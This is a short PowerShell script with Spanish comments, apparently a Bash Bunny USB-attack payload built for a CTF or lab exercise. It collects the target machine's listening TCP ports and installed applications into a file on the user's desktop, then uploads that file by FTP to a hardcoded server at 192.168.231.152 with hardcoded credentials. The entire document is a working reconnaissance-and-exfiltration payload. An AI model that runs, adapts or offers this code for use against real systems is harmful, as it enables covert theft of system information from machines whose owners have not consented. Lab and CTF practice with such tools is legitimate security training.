# Script de PowerShell para revisar puertos abiertos y aplicaciones instaladas

# Obtener la ruta del directorio actual del Bash Bunny
$ruta =""
$volList = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.VolumeName -eq "BashBunny" }
if ($volList) {
    $ruta = $volList.DeviceID
    Write-Output "La ruta del volumen 'BashBunny' es: $ruta"
}
$bashBunnyDir = (Get-Item -Path ".\").FullName

# Crear un directorio para almacenar los resultados en el Bash Bunny
$resultsDir ="C:\Users\Admin\Desktop\"
New-Item -ItemType Directory -Force -Path $resultsDir | Out-Null

# Obtener la lista de puertos abiertos
Write-Output "=== Puertos abiertos ===" > $resultsDir\prueba.txt
Get-NetTCPConnection | Where-Object { $_.State -eq "Listen" } >> $resultsDir\prueba.txt

# Obtener la lista de aplicaciones instaladas
Write-Output "`n=== Aplicaciones instaladas ===" >> $resultsDir\prueba.txt
Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version >> $resultsDir\prueba.txt

# Indicar que el script ha finalizado


# Parámetros FTP
$ftpServer = "192.168.231.152"
$ftpUsername = "ctf"
$ftpPassword = "ctf"

# Ruta local del archivo a enviar
$archivoLocal = "C:\Users\Admin\Desktop\prueba.txt"

# Ruta remota en el servidor FTP
$archivoRemoto = "/Archivo.txt"

# Tiempo de espera en segundos (por ejemplo, 1 hora = 3600 segundos)
$tiempoEspera = 2

# Esperar el tiempo especificado
Start-Sleep -Seconds $tiempoEspera

# Crear objeto FTP
$ftp = [System.Net.WebRequest]::Create("ftp://$ftpServer$archivoRemoto")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftp.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)

# Leer el contenido del archivo local
$contenidoArchivo = Get-Content -Path $archivoLocal -Raw

# Convertir el contenido a bytes
$bytesArchivo = [System.Text.Encoding]::UTF8.GetBytes($contenidoArchivo)

# Subir el archivo al servidor FTP
$stream = $ftp.GetRequestStream()
$stream.Write($bytesArchivo, 0, $bytesArchivo.Length)
$stream.Close()

